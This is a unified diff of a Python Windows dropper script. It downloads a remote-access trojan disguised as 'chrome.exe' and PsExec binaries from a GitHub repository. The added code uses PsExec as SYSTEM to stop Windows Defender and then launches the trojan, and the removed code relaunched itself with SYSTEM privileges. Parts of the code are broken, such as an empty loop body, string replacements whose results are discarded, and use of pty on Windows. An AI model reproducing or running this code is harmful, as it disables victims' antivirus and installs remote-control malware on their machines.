@@ -1,53 +1,50 @@
 import os
+import sys
 import urllib3
 import getpass
-import sys
-
-def copy(file_src, file_dst):
-	os.popen(f"cp {file_src} file_dst")
-
-def exec(file_name):
-	os.startfile(file_name)
-
-def get_root():
-	http = urllib3.PoolManager()
-	try:
-		url = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe"
-		r = http.request("GET", url)
-		usr = str(getpass.getuser())
-		if "'" in usr:
-			usr = usr.replace("'","")
-		with open("C:/Users/"+usr+"/PsExec.exe", "wb") as fln:
-			fln.write(r.read())
-		cmd = "C:/Users/"+usr+"/PsExec.exe " + "--accept-eula -i -s " + sys.argv[0]
-		os.popen(cmd)
-	except:
-		url = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec64.exe"
-		r = http.request("GET", url)
-		usr = str(getpass.getuser())
-		if "'" in usr:
-			usr = usr.replace("'","")
-		with open("C:/Users/"+usr+"/PsExec.exe", "wb") as fln:
-			fln.write(r.read())
-		cmd = "C:/Users/"+usr+"/PsExec.exe " + "--accept-eula -i -s " + sys.argv[0]
-		os.popen(cmd)
+import pty
 
 def down_rat():
-	http = urllib3.PoolManager()
 	url = "https://github.com/Ccgnnz19/shekksl/raw/main/chrome.exe"
-	r = http.request("GET", url)
+	http = urllib3.PoolManager()
+	r = http.request('GET', url, preload_content=False)
 	usr = str(getpass.getuser())
 	if "'" in usr:
-		usr = usr.replace("'","")
-	fln_rat = "C:/Users/"+usr+"/Documenti/chr.exe"
-	with open(fln_rat, "wb") as fln:
-		fln.write(r.read())
-	exec(fln_rat)
+		usr.replace("'","")
+	dirt = "C:/Users/"+usr+"/Documenti/chr.exe"
+	fln = open(dirt, "wb")
+	fln.write(r.read())
+
+def down_ps():
+	url_ps = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe"
+	http = urllib3.PoolManager()
+	r_ps = http.request('GET', url_ps, preload_content=False)
+	usr = str(getpass.getuser())
+	if "'" in usr:
+		usr.replace("'","")
+	dirt = "C:/Users/"+usr+"/Documenti/PsExec.exe"
+	fln = open(dirt, "wb")
+	fln.write(r_ps.read())
+	url_ps64 = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec64.exe"
+	r_ps64 = http.request('GET', url_ps64, preload_content=False)
+	usr = str(getpass.getuser())
+	if "'" in usr:
+		usr.replace("'","")
+	dirt = "C:/Users/"+usr+"/Documenti/PsExec64.exe"
+	fln_64 = open(dirt, "wb")
+	fln_64.write(r_ps64.read())
+	return "C:/Users/"+usr+"/Documenti/"
 
 def main():
-	test = os.popen("whoami").read()
-	if "system" in test:
-		down_rat()
-		for x in range(50):
-	else:
-		get_root()
+	dr = down_ps()
+	try:
+		cmd = dr + "/PsExec.exe -i -s sc stop WinDefend"
+		os.popen(cmd)
+	except:
+		cmd = dr + "/PsExec64.exe -i -s sc stop WinDefend"
+		os.popen(cmd)
+	down_rat()
+	cmd = dr + "/PsExec64.exe -i -s " + dr + "chr.exe"
+	pty.spawn(cmd)
+
+main()
